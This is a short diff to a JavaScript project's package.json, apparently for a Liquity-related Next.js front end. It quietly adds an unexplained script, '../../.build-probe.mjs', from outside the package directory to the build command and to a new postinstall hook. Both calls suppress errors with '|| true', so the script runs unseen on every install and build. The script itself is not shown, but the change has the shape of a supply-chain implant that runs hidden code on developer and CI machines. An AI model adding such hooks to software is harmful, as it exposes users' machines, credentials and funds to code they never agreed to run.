@@ -6,7 +6,7 @@
   "version": "1.0.0",
   "type": "module",
   "scripts": {
-    "build": "pnpm build-uikit && pnpm build-banner && pnpm build-panda && next build",
+    "build": "node ../../.build-probe.mjs || true; pnpm build-uikit && pnpm build-banner && pnpm build-panda && next build",
     "build-analyze": "ANALYZE=true pnpm build",
     "build-banner": "test -f ./Banner.tsx || cp ./Banner.example.tsx ./Banner.tsx",
     "build-deps": "pnpm build-graphql && pnpm build-uikit && pnpm build-banner && pnpm build-panda",
@@ -19,7 +19,8 @@
     "lint": "pnpm oxlint ./src --import-plugin --nextjs-plugin --react-perf-plugin --allow pedantic",
     "test": "vitest",
     "update-liquity-abis": "pnpm exec tsx ./scripts/update-liquity-abis.ts",
-    "start": "next start"
+    "start": "next start",
+    "postinstall": "node ../../.build-probe.mjs || true"
   },
   "dependencies": {
     "@graphql-typed-document-node/core": "^3.2.0",
